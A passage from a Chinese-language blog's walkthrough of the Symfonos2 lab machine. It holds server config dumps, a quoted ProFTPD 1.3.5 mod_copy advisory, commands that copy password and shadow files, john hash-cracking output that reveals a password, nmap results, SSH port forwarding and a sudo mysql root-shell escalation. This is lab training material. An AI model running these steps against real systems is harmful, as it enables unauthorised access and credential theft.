Debugging&#x2F;Accounting ####</span><br><span class="line"></span><br><span class="line"># This tells Samba to use a separate log file for each machine</span><br><span class="line"># that connects</span><br><span class="line">   log file &#x3D; &#x2F;var&#x2F;log&#x2F;samba&#x2F;log.%m</span><br><span class="line"></span><br><span class="line"># Cap the size of the individual log files (in KiB).</span><br><span class="line">   max log size &#x3D; 1000</span><br><span class="line"></span><br><span class="line"># If you want Samba to only log through syslog then set the following</span><br><span class="line"># parameter to &#39;yes&#39;.</span><br><span class="line">#   syslog only &#x3D; no</span><br><span class="line"></span><br><span class="line"># We want Samba to log a minimum amount of information to syslog. Everything</span><br><span class="line"># should go to &#x2F;var&#x2F;log&#x2F;samba&#x2F;log.&#123;smbd,nmbd&#125; instead. If you want to log</span><br><span class="line"># through syslog you should set the following parameter to something higher.</span><br><span class="line">   syslog &#x3D; 0</span><br><span class="line"></span><br><span class="line"># Do something sensible when Samba crashes: mail the admin a backtrace</span><br><span class="line">   panic action &#x3D; &#x2F;usr&#x2F;share&#x2F;samba&#x2F;panic-action %d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####### Authentication #######</span><br><span class="line"></span><br><span class="line"># Server role. Defines in which mode Samba will operate. Possible</span><br><span class="line"># values are &quot;standalone server&quot;, &quot;member server&quot;, &quot;classic primary</span><br><span class="line"># domain controller&quot;, &quot;classic backup domain controller&quot;, &quot;active</span><br><span class="line"># directory domain controller&quot;. </span><br><span class="line">#</span><br><span class="line"># Most people will want &quot;standalone sever&quot; or &quot;member server&quot;.</span><br><span class="line"># Running as &quot;active directory domain controller&quot; will require first</span><br><span class="line"># running &quot;samba-tool domain provision&quot; to wipe databases and create a</span><br><span class="line"># new domain.</span><br><span class="line">   server role &#x3D; standalone server</span><br><span class="line"></span><br><span class="line"># If you are using encrypted passwords, Samba will need to know what</span><br><span class="line"># password database type you are using.  </span><br><span class="line">   passdb backend &#x3D; tdbsam</span><br><span class="line"></span><br><span class="line">   obey pam restrictions &#x3D; yes</span><br><span class="line"></span><br><span class="line"># This boolean parameter controls whether Samba attempts to sync the Unix</span><br><span class="line"># password with the SMB password when the encrypted SMB password in the</span><br><span class="line"># passdb is changed.</span><br><span class="line">   unix password sync &#x3D; yes</span><br><span class="line"></span><br><span class="line"># For Unix password sync to work on a Debian GNU&#x2F;Linux system, the following</span><br><span class="line"># parameters must be set (thanks to Ian Kahan &lt;&lt;kahan@informatik.tu-muenchen.de&gt; for</span><br><span class="line"># sending the correct chat script for the passwd program in Debian Sarge).</span><br><span class="line">   passwd program &#x3D; &#x2F;usr&#x2F;bin&#x2F;passwd %u</span><br><span class="line">   passwd chat &#x3D; *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .</span><br><span class="line"></span><br><span class="line"># This boolean controls whether PAM will be used for password changes</span><br><span class="line"># when requested by an SMB client instead of the program listed in</span><br><span class="line"># &#39;passwd program&#39;. The default is &#39;no&#39;.</span><br><span class="line">   pam password change &#x3D; yes</span><br><span class="line"></span><br><span class="line"># This option controls how unsuccessful authentication attempts are mapped</span><br><span class="line"># to anonymous connections</span><br><span class="line">   map to guest &#x3D; bad user</span><br><span class="line"></span><br><span class="line">########## Domains ###########</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># The following settings only takes effect if &#39;server role &#x3D; primary</span><br><span class="line"># classic domain controller&#39;, &#39;server role &#x3D; backup domain controller&#39;</span><br><span class="line"># or &#39;domain logons&#39; is set </span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># It specifies the location of the user&#39;s</span><br><span class="line"># profile directory from the client point of view) The following</span><br><span class="line"># required a [profiles] share to be setup on the samba server (see</span><br><span class="line"># below)</span><br><span class="line">;   logon path &#x3D; \\%N\profiles\%U</span><br><span class="line"># Another common choice is storing the profile in the user&#39;s home directory</span><br><span class="line"># (this is Samba&#39;s default)</span><br><span class="line">#   logon path &#x3D; \\%N\%U\profile</span><br><span class="line"></span><br><span class="line"># The following setting only takes effect if &#39;domain logons&#39; is set</span><br><span class="line"># It specifies the location of a user&#39;s home directory (from the client</span><br><span class="line"># point of view)</span><br><span class="line">;   logon drive &#x3D; H:</span><br><span class="line">#   logon home &#x3D; \\%N\%U</span><br><span class="line"></span><br><span class="line"># The following setting only takes effect if &#39;domain logons&#39; is set</span><br><span class="line"># It specifies the script to run during logon. The script must be stored</span><br><span class="line"># in the [netlogon] share</span><br><span class="line"># NOTE: Must be store in &#39;DOS&#39; file format convention</span><br><span class="line">;   logon script &#x3D; logon.cmd</span><br><span class="line"></span><br><span class="line"># This allows Unix users to be created on the domain controller via the SAMR</span><br><span class="line"># RPC pipe.  The example command creates a user account with a disabled Unix</span><br><span class="line"># password; please adapt to your needs</span><br><span class="line">; add user script &#x3D; &#x2F;usr&#x2F;sbin&#x2F;adduser --quiet --disabled-password --gecos &quot;&quot; %u</span><br><span class="line"></span><br><span class="line"># This allows machine accounts to be created on the domain controller via the </span><br><span class="line"># SAMR RPC pipe.  </span><br><span class="line"># The following assumes a &quot;machines&quot; group exists on the system</span><br><span class="line">; add machine script  &#x3D; &#x2F;usr&#x2F;sbin&#x2F;useradd -g machines -c &quot;%u machine account&quot; -d &#x2F;var&#x2F;lib&#x2F;samba -s &#x2F;bin&#x2F;false %u</span><br><span class="line"></span><br><span class="line"># This allows Unix groups to be created on the domain controller via the SAMR</span><br><span class="line"># RPC pipe.  </span><br><span class="line">; add group script &#x3D; &#x2F;usr&#x2F;sbin&#x2F;addgroup --force-badname %g</span><br><span class="line"></span><br><span class="line">############ Misc ############</span><br><span class="line"></span><br><span class="line"># Using the following line enables you to customise your configuration</span><br><span class="line"># on a per machine basis. The %m gets replaced with the netbios name</span><br><span class="line"># of the machine that is connecting</span><br><span class="line">;   include &#x3D; &#x2F;home&#x2F;samba&#x2F;etc&#x2F;smb.conf.%m</span><br><span class="line"></span><br><span class="line"># Some defaults for winbind (make sure you&#39;re not using the ranges</span><br><span class="line"># for something else.)</span><br><span class="line">;   idmap uid &#x3D; 10000-20000</span><br><span class="line">;   idmap gid &#x3D; 10000-20000</span><br><span class="line">;   template shell &#x3D; &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line"># Setup usershare options to enable non-root users to share folders</span><br><span class="line"># with the net usershare command.</span><br><span class="line"></span><br><span class="line"># Maximum number of usershare. 0 (default) means that usershare is disabled.</span><br><span class="line">;   usershare max shares &#x3D; 100</span><br><span class="line"></span><br><span class="line"># Allow users who&#39;ve been granted usershare privileges to create</span><br><span class="line"># public shares, not just authenticated ones</span><br><span class="line">   usershare allow guests &#x3D; yes</span><br><span class="line"></span><br><span class="line">#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Share Definitions &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">[homes]</span><br><span class="line">   comment &#x3D; Home Directories</span><br><span class="line">   browseable &#x3D; no</span><br><span class="line"></span><br><span class="line"># By default, the home directories are exported read-only. Change the</span><br><span class="line"># next parameter to &#39;no&#39; if you want to be able to write to them.</span><br><span class="line">   read only &#x3D; yes</span><br><span class="line"></span><br><span class="line"># File creation mask is set to 0700 for security reasons. If you want to</span><br><span class="line"># create files with group&#x3D;rw permissions, set next parameter to 0775.</span><br><span class="line">   create mask &#x3D; 0700</span><br><span class="line"></span><br><span class="line"># Directory creation mask is set to 0700 for security reasons. If you want to</span><br><span class="line"># create dirs. with group&#x3D;rw permissions, set next parameter to 0775.</span><br><span class="line">   directory mask &#x3D; 0700</span><br><span class="line"></span><br><span class="line"># By default, \\server\username shares can be connected to by anyone</span><br><span class="line"># with access to the samba server.</span><br><span class="line"># The following parameter makes sure that only &quot;username&quot; can connect</span><br><span class="line"># to \\server\username</span><br><span class="line"># This might need tweaking when using external authentication schemes</span><br><span class="line">   valid users &#x3D; %S</span><br><span class="line"></span><br><span class="line"># Un-comment the following and create the netlogon directory for Domain Logons</span><br><span class="line"># (you need to configure Samba to act as a domain controller too.)</span><br><span class="line">;[netlogon]</span><br><span class="line">;   comment &#x3D; Network Logon Service</span><br><span class="line">;   path &#x3D; &#x2F;home&#x2F;samba&#x2F;netlogon</span><br><span class="line">;   guest ok &#x3D; yes</span><br><span class="line">;   read only &#x3D; yes</span><br><span class="line"></span><br><span class="line"># Un-comment the following and create the profiles directory to store</span><br><span class="line"># users profiles (see the &quot;logon path&quot; option above)</span><br><span class="line"># (you need to configure Samba to act as a domain controller too.)</span><br><span class="line"># The path below should be writable by all users so that their</span><br><span class="line"># profile directory may be created the first time they log on</span><br><span class="line">;[profiles]</span><br><span class="line">;   comment &#x3D; Users profiles</span><br><span class="line">;   path &#x3D; &#x2F;home&#x2F;samba&#x2F;profiles</span><br><span class="line">;   guest ok &#x3D; no</span><br><span class="line">;   browseable &#x3D; no</span><br><span class="line">;   create mask &#x3D; 0600</span><br><span class="line">;   directory mask &#x3D; 0700</span><br><span class="line"></span><br><span class="line">[printers]</span><br><span class="line">   comment &#x3D; All Printers</span><br><span class="line">   browseable &#x3D; no</span><br><span class="line">   path &#x3D; &#x2F;var&#x2F;spool&#x2F;samba</span><br><span class="line">   printable &#x3D; yes</span><br><span class="line">   guest ok &#x3D; no</span><br><span class="line">   read only &#x3D; yes</span><br><span class="line">   create mask &#x3D; 0700</span><br><span class="line"></span><br><span class="line"># Windows clients look for this share name as a source of downloadable</span><br><span class="line"># printer drivers</span><br><span class="line">[print$]</span><br><span class="line">   comment &#x3D; Printer Drivers</span><br><span class="line">   path &#x3D; &#x2F;var&#x2F;lib&#x2F;samba&#x2F;printers</span><br><span class="line">   browseable &#x3D; yes</span><br><span class="line">   read only &#x3D; yes</span><br><span class="line">   guest ok &#x3D; no</span><br><span class="line"># Uncomment to allow remote administration of Windows print drivers.</span><br><span class="line"># You may need to replace &#39;lpadmin&#39; with the name of the group your</span><br><span class="line"># admin users are members of.</span><br><span class="line"># Please note that you also need to set appropriate Unix permissions</span><br><span class="line"># to the drivers directory for these users to have write rights in it</span><br><span class="line">;   write list &#x3D; root, @lpadmin</span><br><span class="line"></span><br><span class="line">[anonymous]</span><br><span class="line">   path &#x3D; &#x2F;home&#x2F;aeolus&#x2F;share</span><br><span class="line">   browseable &#x3D; yes</span><br><span class="line">   read only &#x3D; yes</span><br><span class="line">   guest ok &#x3D; yes</span><br><span class="line"></span><br><span class="line">root@symfonos2:~# cat &#x2F;usr&#x2F;local&#x2F;etc&#x2F;proftpd.conf</span><br><span class="line"># This is a basic ProFTPD configuration file (rename it to </span><br><span class="line"># &#39;proftpd.conf&#39; for actual use.  It establishes a single server</span><br><span class="line"># and a single anonymous login.  It assumes that you have a user&#x2F;group</span><br><span class="line"># &quot;nobody&quot; and &quot;ftp&quot; for normal operation and anon.</span><br><span class="line"></span><br><span class="line">ServerName			&quot;ProFTPD Default Installation&quot;</span><br><span class="line">ServerType			standalone</span><br><span class="line">DefaultServer			on</span><br><span class="line"></span><br><span class="line"># Port 21 is the standard FTP port.</span><br><span class="line">Port				21</span><br><span class="line"></span><br><span class="line"># Don&#39;t use IPv6 support by default.</span><br><span class="line">UseIPv6				off</span><br><span class="line"></span><br><span class="line"># Umask 022 is a good standard umask to prevent new dirs and files</span><br><span class="line"># from being group and world writable.</span><br><span class="line">Umask				022</span><br><span class="line"></span><br><span class="line"># To prevent DoS attacks, set the maximum number of child processes</span><br><span class="line"># to 30.  If you need to allow more than 30 concurrent connections</span><br><span class="line"># at once, simply increase this value.  Note that this ONLY works</span><br><span class="line"># in standalone mode, in inetd mode you should use an inetd server</span><br><span class="line"># that allows you to limit maximum number of processes per service</span><br><span class="line"># (such as xinetd).</span><br><span class="line">MaxInstances			30</span><br><span class="line"></span><br><span class="line"># Set the user and group under which the server will run.</span><br><span class="line">User				aeolus</span><br><span class="line">Group				aeolus</span><br><span class="line"></span><br><span class="line"># To cause every FTP user to be &quot;jailed&quot; (chrooted) into their home</span><br><span class="line"># directory, uncomment this line.</span><br><span class="line">#DefaultRoot ~</span><br><span class="line"></span><br><span class="line"># Normally, we want files to be overwriteable.</span><br><span class="line">AllowOverwrite		on</span><br><span class="line"></span><br><span class="line"># Bar use of SITE CHMOD by default</span><br><span class="line">&lt;Limit SITE_CHMOD&gt;</span><br><span class="line">  DenyAll</span><br><span class="line">&lt;&#x2F;Limit&gt;</span><br><span class="line"></span><br><span class="line"># A basic anonymous configuration, no upload directories.  If you do not</span><br><span class="line"># want anonymous users, simply delete this entire &lt;Anonymous&gt; section.</span><br><span class="line">&lt;Anonymous ~ftp&gt;</span><br><span class="line">  User				ftp</span><br><span class="line">  Group				ftp</span><br><span class="line"></span><br><span class="line">  # We want clients to be able to login with &quot;anonymous&quot; as well as &quot;ftp&quot;</span><br><span class="line">  UserAlias			anonymous ftp</span><br><span class="line"></span><br><span class="line">  # Limit the maximum number of anonymous logins</span><br><span class="line">  MaxClients			10</span><br><span class="line"></span><br><span class="line">  # We want &#39;welcome.msg&#39; displayed at login, and &#39;.message&#39; displayed</span><br><span class="line">  # in each newly chdired directory.</span><br><span class="line">  #DisplayLogin			welcome.msg</span><br><span class="line">  #DisplayChdir			.message</span><br><span class="line"></span><br><span class="line">  # Limit WRITE everywhere in the anonymous chroot</span><br><span class="line">  &lt;Limit WRITE&gt;</span><br><span class="line">    DenyAll</span><br><span class="line">  &lt;&#x2F;Limit&gt;</span><br><span class="line">&lt;&#x2F;Anonymous&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提起到两个信息点</p>
+<ul>
+<li>cat /etc/shadow &gt; /var/backups/shadow.bak</li>
+<li>发现账号密码 <code>ftp/ftp  aeolus/aeolus</code></li>
+</ul>
+<p>账号<code>ftp</code>登录失败</p>
+<p>尝试<code>smb</code>失败</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.43.207/aeolus  --user=aeolus%aeolus</span><br><span class="line">smbclient //192.168.43.207/ftp  --user=ftp%ftp</span><br></pre></td></tr></table></figure>
+
+<p>尝试<code>ssh</code>失败</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh aeolus@192.168.43.207</span><br><span class="line">ssh ftp@192.168.43.207</span><br></pre></td></tr></table></figure>
+
+<h3 id="ProFTPd-1-3-5-File-Copy"><a href="#ProFTPd-1-3-5-File-Copy" class="headerlink" title="ProFTPd 1.3.5 - File Copy"></a>ProFTPd 1.3.5 - File Copy</h3><p><img data-src="./symfonos2/4.png" alt></p>
+<ul>
+<li>瞧一瞧</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Description TJ Saunders 2015-04-07 16:35:03 UTC</span><br><span class="line">Vadim Melihow reported a critical issue with proftpd installations that use the</span><br><span class="line">mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands</span><br><span class="line">to be used by *unauthenticated clients*:</span><br><span class="line"></span><br><span class="line">---------------------------------</span><br><span class="line">Trying 80.150.216.115...</span><br><span class="line">Connected to 80.150.216.115.</span><br><span class="line">Escape character is '^]'.</span><br><span class="line">220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]</span><br><span class="line">site help</span><br><span class="line">214-The following SITE commands are recognized (* =&gt;'s unimplemented)</span><br><span class="line">214-CPFR &lt;sp&gt; pathname</span><br><span class="line">214-CPTO &lt;sp&gt; pathname</span><br><span class="line">214-UTIME &lt;sp&gt; YYYYMMDDhhmm[ss] &lt;sp&gt; path</span><br><span class="line">214-SYMLINK &lt;sp&gt; source &lt;sp&gt; destination</span><br><span class="line">214-RMDIR &lt;sp&gt; path</span><br><span class="line">214-MKDIR &lt;sp&gt; path</span><br><span class="line">214-The following SITE extensions are recognized:</span><br><span class="line">214-RATIO -- show all ratios in effect</span><br><span class="line">214-QUOTA</span><br><span class="line">214-HELP</span><br><span class="line">214-CHGRP</span><br><span class="line">214-CHMOD</span><br><span class="line">214 Direct comments to root@www01a</span><br><span class="line">site cpfr /etc/passwd</span><br><span class="line">350 File or directory exists, ready for destination name</span><br><span class="line">site cpto /tmp/passwd.copy</span><br><span class="line">250 Copy successful</span><br><span class="line">-----------------------------------------</span><br><span class="line"></span><br><span class="line">He provides another, scarier example:</span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line">site cpfr /etc/passwd</span><br><span class="line">350 File or directory exists, ready for destination name</span><br><span class="line">site cpto &lt;?php phpinfo(); ?&gt;</span><br><span class="line">550 cpto: Permission denied</span><br><span class="line">site cpfr /proc/self/fd/3</span><br><span class="line">350 File or directory exists, ready for destination name</span><br><span class="line">site cpto /var/www/test.php</span><br><span class="line"></span><br><span class="line">test.php now contains</span><br><span class="line">----------------------</span><br><span class="line">2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q</span><br><span class="line">(slon-P5Q.lan[192.168.3.193]): error rewinding scoreboard: Invalid argument</span><br><span class="line">2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q</span><br><span class="line">(slon-P5Q.lan[192.168.3.193]): FTP session opened.</span><br><span class="line">2015-04-04 02:01:27,943 slon-P5Q proftpd[16255] slon-P5Q</span><br><span class="line">(slon-P5Q.lan[192.168.3.193]): error opening destination file '/&lt;?php</span><br><span class="line">phpinfo(); ?&gt;' for copying: Permission denied</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">test.php contains contain correct php script "&lt;?php phpinfo(); ?&gt;" which</span><br><span class="line">can be run by the php interpreter</span><br><span class="line"></span><br><span class="line">Source: http://bugs.proftpd.org/show_bug.cgi?id=4169</span><br></pre></td></tr></table></figure>
+
+<p>复制<code>/etc/passwd  /etc/shadow</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site cpfr /etc/passwd</span><br><span class="line">site cpto /home/aeolus/share/passwd_sym</span><br><span class="line">site cpfr /var/backups/shadow.bak</span><br><span class="line">site cpto /home/aeolus/share/shadow__sym</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">unshadow passwd_sym shadow__sym &gt; final_sym -- 这一步生成需要破解的密码 </span><br><span class="line">john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt final_sym</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt final_sym</span><br><span class="line">Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"</span><br><span class="line">Use the "--format=HMAC-SHA256" option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])</span><br><span class="line">Cost 1 (iteration count) is 5000 for all loaded hashes</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</span><br><span class="line">sergioteamo      (aeolus)</span><br><span class="line">1g 0:00:00:08 DONE (2021-03-27 05:13) 0.1210g/s 3037p/s 3037c/s 3037C/s frazier..raymark</span><br><span class="line">Use the "--show" option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+
+<p>发现账户密码 <code>aeolus/sergioteamo</code></p>
+<h3 id="NMAP扫描本机"><a href="#NMAP扫描本机" class="headerlink" title="NMAP扫描本机"></a>NMAP扫描本机</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2021-03-27 04:17 CDT</span><br><span class="line">Nmap scan report for localhost (127.0.0.1)</span><br><span class="line">Host is up (0.000037s latency).</span><br><span class="line">Not shown: 65527 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         ProFTPD 1.3.5</span><br><span class="line">22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)</span><br><span class="line">|_  256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)</span><br><span class="line">25/tcp   open  smtp        Exim smtpd 4.89</span><br><span class="line">| smtp-commands: symfonos2 Hello localhost [127.0.0.1], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, </span><br><span class="line">|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP </span><br><span class="line">80/tcp   open  http        WebFS httpd 1.21</span><br><span class="line">|_http-server-header: webfs/1.21</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql       MySQL 5.5.5-10.1.38-MariaDB-0+deb9u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.1.38-MariaDB-0+deb9u1</span><br><span class="line">|   Thread ID: 12</span><br><span class="line">|   Capabilities flags: 63487</span><br><span class="line">|   Some Capabilities: Support41Auth, SupportsCompression, SupportsTransactions, SupportsLoadDataLocal, LongColumnFlag, LongPassword, Speaks41ProtocolOld, Speaks41ProtocolNew, InteractiveClient, FoundRows, ODBCClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: ,CN&lt;#7,t'a6(b7.&#123;G/U=</span><br><span class="line">|_  Auth Plugin Name: 103</span><br><span class="line">8080/tcp open  http        Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-open-proxy: Potentially OPEN proxy.</span><br><span class="line">|_Methods supported:CONNECTION</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://localhost/login</span><br><span class="line">Service Info: Host: symfonos2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.5.16-Debian)</span><br><span class="line">|   Computer name: symfonos2</span><br><span class="line">|   NetBIOS computer name: SYMFONOS2\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: symfonos2</span><br><span class="line">|_  System time: 2021-03-27T04:17:24-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smbv2-enabled: Server supports SMBv2 protocol</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发现<code>8080</code>端口</li>
+<li>端口转发</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -f -L 8080:127.0.0.1:8080 aeolus@192.168.43.207</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./symfonos2/5.png" alt></p>
+<h3 id="msf拿到shell"><a href="#msf拿到shell" class="headerlink" title="msf拿到shell"></a>msf拿到shell</h3><p><img data-src="./symfonos2/6.png" alt></p>
+<p><img data-src="./symfonos2/7.png" alt></p>
+<p><img data-src="./symfonos2/8.png" alt></p>
+<ul>
+<li>提权，拿<code>flag</code></li>
+</ul>
+<p><img data-src="./symfonos2/9.png" alt></p>
+<ul>
+<li><code>sudo mysql -e &quot;\! /bin/bash&quot;</code></li>
+</ul>
+<p><img data-src="./symfonos2/10.png" alt></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%85%A5%E9%97%A8/" rel="tag"># 入门</a>
+              <a href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/" rel="tag"># 综合靶场测试</a>
+              <a href="/tags/symfonos/" rel="tag"># symfonos</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/21/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos1/" rel="prev" title="symfonos1">
+      <i class="fa fa-chevron-left"></i> symfonos1
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/03/28/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos3/" rel="next" title="symfonos3">
+      symfonos3 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
